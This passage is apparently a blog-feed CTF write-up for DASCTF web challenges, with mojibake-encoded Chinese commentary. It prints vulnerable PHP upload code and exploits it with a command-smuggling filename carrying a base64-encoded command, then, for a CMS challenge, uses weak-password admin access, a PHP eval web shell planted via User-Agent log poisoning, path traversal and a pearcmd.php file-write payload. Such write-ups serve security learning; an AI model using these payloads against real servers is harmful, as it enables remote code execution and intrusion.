class="string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">      &#125;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">echo</span> <span class="string">&#x27;</span></span></span><br><span class="line"><span class="string"><span class="language-php">  &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">  é€‰æ‹©å›¾ç‰‡ï¼š&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">  &lt;input type=&quot;submit&quot; value=&quot;ä¸Šä¼ &quot;&gt;&lt;/form&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-php">  &#x27;</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span></span><br><span class="line"><span class="language-php">      <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span></span><br><span class="line"><span class="language-php">      <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span></span><br><span class="line"><span class="language-php">      &#125;</span></span><br><span class="line"><span class="language-php">      <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$filename</span>)) &#123;</span></span><br><span class="line"><span class="language-php">          <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;å›¾ç‰‡ä¸Šä¼ æˆåŠŸ!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">      &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">die</span>(<span class="string">&#x27;failed&#x27;</span>);</span></span><br><span class="line"><span class="language-php">      &#125;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">  &#125;</span></span><br><span class="line"><span class="language-php">  <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-php">      <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span></span><br><span class="line"><span class="language-php">      <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;md5&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-php">          <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span></span><br><span class="line"><span class="language-php">      &#125;</span></span><br><span class="line"><span class="language-php">      <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-php">          <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FILE</span>(<span class="variable">$filename</span>);</span></span><br><span class="line"><span class="language-php">          <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;remove&quot;</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;show&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-php">              <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;../&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">              <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=remove&#x27;&gt;remove&lt;/a&gt;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">              <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=show&#x27;&gt;show&lt;/a&gt;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;remove&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-php">              <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">remove</span>();</span></span><br><span class="line"><span class="language-php">              <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;å›¾ç‰‡å·²åˆ é™¤!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;show&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-php">              <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">show</span>();</span></span><br><span class="line"><span class="language-php">          &#125;</span></span><br><span class="line"><span class="language-php">      &#125;</span></span><br><span class="line"><span class="language-php">  &#125;</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>åˆ†ææºç </p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">å¦‚æœä¸å­˜åœ¨session[<span class="string">&#x27;user&#x27;</span>]ï¼Œå‡ºç°ç™»å½•è¡¨å•ï¼Œæäº¤è¡¨å•ä¹‹åå°±ä¼šç»™session[<span class="string">&#x27;user&#x27;</span>]è¿›è¡Œèµ‹å€¼ã€‚</span><br><span class="line">ç¬¬ä¸€æ¬¡ç™»å½•åå†å›åˆ°åŸè¡¨å•å°±ä¼šè§¦å‘jsæç¤ºä¸æ˜¯<span class="literal">admin</span>ï¼Œå¹¶è·å¾—æºç æ–‡ä»¶çš„ä½ç½®ï¼Œè¿›å…¥ä¸‹ä¸€ä¸ªif</span><br><span class="line"></span><br><span class="line">å¦‚æœä¸å­˜åœ¨<span class="keyword">file</span>ï¼Œé‚£å°±è§¦å‘æ–‡ä»¶ä¸Šä¼ è¡¨å•ï¼Œactionä¸ºindex.phpï¼Œå¦‚æœå­˜åœ¨ä¸Šä¼ æ–‡ä»¶ï¼Œé‚£ä¹ˆå°±å¯¹æ–‡ä»¶åç¼€è¿›è¡Œåˆ¤æ–­å¹¶è¿”å›ä¸Šä¼ æˆåŠŸæç¤º</span><br><span class="line">å¦‚æœå­˜åœ¨<span class="keyword">file</span>ï¼Œé‚£ä¹ˆå°±å°†æ–‡ä»¶åèµ‹å€¼ç»™<span class="variable">$filename</span>ï¼Œç„¶åå¼•ç”¨<span class="keyword">FILE</span>ç±»å¯¹æ–‡ä»¶åè¿›è¡Œå¤„ç†ï¼Œconstructä¸»è¦æ˜¯è¿‡æ»¤äº†/å’Œå¤šä¸ª.ï¼Œä¸”åˆ¤æ–­äº†æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœæ–‡ä»¶å­˜åœ¨ï¼Œé‚£ä¹ˆå°±æ‰§è¡Œ<span class="params">system</span>å‡½æ•°</span><br></pre></td></tr></table></figure><p>å…·ä½“æ“ä½œ<img src="../DASCTF/image-20230722205634843.png" alt=""></p><p><img src="../DASCTF/image-20230722205650142.png" alt="image-20230722205650142"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#index.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>ç”¨æˆ·ç™»å½•<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>ç”¨æˆ·ç™»å½•<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://2f3204e1-d884-4172-86aa-0ac751e580de.node4.buuoj.cn:81/index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;username&quot;</span>&gt;</span>ç”¨æˆ·åï¼š<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">required</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;password&quot;</span>&gt;</span>å¯†ç ï¼š<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">required</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>æ–‡ä»¶åï¼š<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;æäº¤&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å†™è¡¨å•è¿›è¡Œç™»å½•å’Œæ–‡ä»¶ä¸Šä¼ ï¼Œä¸Šä¼ æ–‡ä»¶ä¹‹åå†ç”¨å¦ä¸€ä¸ªç•Œé¢è¿›è¡Œ<span class="built_in">get</span>ä¼ <span class="built_in">file</span>ï¼Œä¼ å…¥çš„<span class="built_in">file</span>åå¿…é¡»å’Œä¸Šä¼ çš„æ–‡ä»¶åæ˜¯ä¸€æ ·çš„ï¼Œè¿›è€Œè§¦å‘<span class="keyword">system</span>å‘½ä»¤æ‰§è¡Œã€‚</span><br><span class="line">ç”±äºå¯¹/å’Œ.å…·æœ‰ä¸¥æ ¼è¿‡æ»¤ï¼Œæ‰€ä»¥è¿™é‡Œé‡‡ç”¨ç¼–ç ç»•è¿‡</span><br><span class="line">;`echo Y2F0IC9hZGoq | base64 -d`;.jpg</span><br><span class="line">bpä¼ å‚éœ€è¦æŠŠç©ºæ ¼æ”¹ä¸º+å·</span><br></pre></td></tr></table></figure><h2 id="ez-cms">ez_cms</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">çœ‹åˆ°æ˜¯ä¸ªç½‘é¡µç›´æ¥ç›²çŒœä¸€æ‰‹åå°ç®¡ç†ç•Œé¢/adminï¼Œç„¶åå¼±å£ä»¤è¯•äº†ä¸€ä¸‹å°±è¿›å»äº†</span><br></pre></td></tr></table></figure><p><img src="../DASCTF/image-20230722211756542.png" alt="image-20230722211756542"></p><p>è¿™é‡Œæ˜¯æœ‰ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œbutå¥½åƒæ²¡ä»€ä¹ˆåµç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ç„¶åå°±æƒ³æ˜¯å¦å¯ä»¥è¿›è¡Œæ—¥å¿—åŒ…å«</span><br><span class="line">æ·»åŠ UAï¼š<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[chuling]); <span class="meta">?&gt;</span></span><br><span class="line">ç„¶åè®¿é—®url:   url/admin/r=../../../../../../<span class="keyword">var</span>/log/nginx/access.log</span><br><span class="line">ç”¨èšå‰‘å°è¯•è¿æ¥ï¼Œç»“æœå¤±è´¥äº†ã€‚</span><br></pre></td></tr></table></figure><p>è¿™æ—¶å€™å°±åˆæ¥äº†ä¸€ä¸ªpearcmd.phpæ–‡ä»¶åŒ…å«</p><p>å‚è€ƒåšå®¢ï¼š<a href="https://blog.csdn.net/Mrs_H/article/details/122386511">https://blog.csdn.net/Mrs_H/article/details/122386511</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å…·ä½“æ“ä½œä¸º?+config-create+<span class="regexp">/&amp;r=/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../u</span>sr<span class="regexp">/share/</span>php<span class="regexp">/pearcmd&amp;/</span>&lt;?=eval(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]);?&gt;+<span class="regexp">/tmp/</span>chuling2.php</span><br><span class="line"></span><br><span class="line">æˆåŠŸä¹‹åç›´æ¥èšå‰‘è¿æ¥å¾—åˆ°flag</span><br></pre></td></tr></table></figure><p><img src="../DASCTF/image-20230722214619617.png" alt="image-20230722214619617"></p>]]></content>
    
    
    <summary type="html">DASCTF wpæ¥å’¯~ web 3/5</summary>
    
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/categories/CTF/"/>
    
    <category term="æ¯”èµ›WP" scheme="https://bowuchuling.github.io/categories/CTF/%E6%AF%94%E8%B5%9BWP/"/>
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="https://bowuchuling.github.io/tags/WP/"/>
    
  </entry>
  
</feed>
